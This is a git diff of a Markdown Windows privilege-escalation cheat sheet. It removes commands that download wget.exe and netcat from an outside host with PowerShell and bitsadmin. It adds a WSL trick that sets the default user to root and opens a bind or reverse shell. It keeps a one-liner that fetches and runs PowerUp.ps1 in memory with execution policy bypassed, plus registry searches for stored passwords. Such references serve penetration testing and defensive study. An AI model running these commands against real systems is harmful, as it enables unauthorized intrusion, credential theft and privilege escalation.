@@ -1,7 +1,5 @@
 # Windows - Privilege Escalation
 
-Almost all of the following commands are from [The Open Source Windows Privilege Escalation Cheat Sheet](https://addaxsoft.com/wpecs/)
-
 ## Windows Version and Configuration
 
 ```powershell
@@ -132,7 +130,7 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 ```
 
-### Password in unattend.xml
+### Passwords in unattend.xml
 
 Location of the unattend.xml files
 
@@ -167,7 +165,7 @@ Example content
 
 The Metasploit module `post/windows/gather/enum_unattend` looks for these files.
 
-## Processes Enum
+## Processes Enumeration
 
 What processes are running?
 
@@ -187,30 +185,25 @@ Do you have powershell magic?
 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
 ```
 
-## Uploading / Downloading files
+## Using PowerSploit's PowerUp
 
-a wget using powershell
-
-```powershell
-powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"
-```
-
-wget using bitsadmin (when powershell is not present)
-
-```powershell
-cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/download/wpecs/wget.exe %TEMP%\wget.exe"
-```
-
-now you have wget.exe that can be executed from %TEMP%wget for example I will use it here to download netcat
-
-```powershell
-%TEMP%\wget https://addaxsoft.com/download/wpecs/nc.exe
-```
-
-## Spot the weak service using PowerSploit's PowerUP
+Spot the weak service using PowerSploit's PowerUp
 
 ```powershell
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+```
+
+## Using Windows Subsystem for Linux (WSL)
+
+Technique borrowed from [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)
+
+> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ <distro>.exe --default-user root. Now start your bind shell or reverse.
+
+```powershell
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
 
 ## Thanks to
@@ -220,3 +213,4 @@ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadS
 * [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
 * [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
 * [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
+* [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
